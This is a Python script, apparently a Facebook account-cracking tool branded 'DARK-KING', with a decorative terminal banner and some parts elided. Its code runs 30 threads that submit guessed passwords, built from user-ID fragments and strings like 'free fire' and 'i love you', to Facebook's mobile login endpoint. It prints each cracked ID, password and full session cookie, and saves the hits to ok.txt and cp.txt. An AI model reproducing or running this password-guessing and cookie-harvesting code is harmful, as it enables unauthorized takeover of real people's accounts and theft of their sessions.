...
\33[38;5;196m [>☠<] \033[1;35m𝐃𝐀𝐑𝐊[] 𝐊𝐈𝐍𝐆[🔰]\033[34;1m𝐂𝐑𝐄𝐀𝐓𝐄𝐃 𝐁𝐘 :𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆
\33[38;5;196m [>☠<] \033[1;35m𝐃𝐀𝐑𝐊[] 𝐊𝐈𝐍𝐆[🔰]\033[34;1m𝐅𝐀𝐂𝐄𝐁𝐎𝐊 :𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆
\33[38;5;196m [>☠<] \033[1;35m𝐃𝐀𝐑𝐊[] 𝐊𝐈𝐍𝐆[🔰]\033[34;1m𝐆𝐈𝐓𝐇𝐔𝐁 :𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆 𝐂𝐘𝐁𝐄𝐑𝟕𝟏
\33[38;5;196m [>☠<] \033[1;35m𝐃𝐀𝐑𝐊[] 𝐊𝐈𝐍𝐆[🔰]\033[34;1m𝐓𝐎𝐎𝐋 :𝐒𝐓𝐀𝐓𝐔𝐒 :𝐅𝐑𝐄𝐄
\33[38;5;196m [>☠<] \033[1;35m𝐃𝐀𝐑𝐊[] 𝐊𝐈𝐍𝐆[🔰]\033[34;1m𝐏𝐀𝐆𝐄 :𝐃𝐀𝐑𝐊𝐖𝐄𝐁𝐂𝐘𝐁𝐄𝐑 𝐂𝐎𝐌𝐌𝐔𝐍𝐈𝐓𝐘  𝟒𝟎𝟒
\33[38;5;196m [>☠<] \033[1;35m𝐃𝐀𝐑𝐊[] 𝐊𝐈𝐍𝐆[🔰]\033[34;1m𝐓𝐎𝐎𝐋 :𝐕𝐈𝐑𝐒𝐈𝐎𝐍 :𝟎.𝟗        
\033[38;5;46⊰᯽════════════\033[1;32m★\033[1;36m═════════════\033[1;32m★\033[1;35m════════════\033[1;32m★\033[0;93m═════════════⊰᯽""")
...
def v3():
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        for guru in user:
            ...
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh','free fire','PUBG','free fire','i love you']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(50*'_')
    print(' [♥] Crack process has been completed')
    print(' [♥] Ids saved in ok.txt,cp.txt')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mDARK-KING\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            header_freefb = {
              ...
              'dpr': '2',
              'referer': 'https://mbasic.facebook.com/login.php?next=https%3A%2F%2Fmbasic.facebook.com%2F&refsrc=deprecated&wtsid=rdr_0gklrupPUTUx5Oy1F&_rdr',
              ...
              'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/?next=https%3A%2F%2Fmbasic.facebook.com%2F&ref=dbl&fl&login_from_aymh=1&refid=9',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[DARK-KING-OK🌻] {uid}|{ps}")
                print(f"\n[COOKIE🎁] : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[DARK-KING-CP❌] {uid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[DARK-KING💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
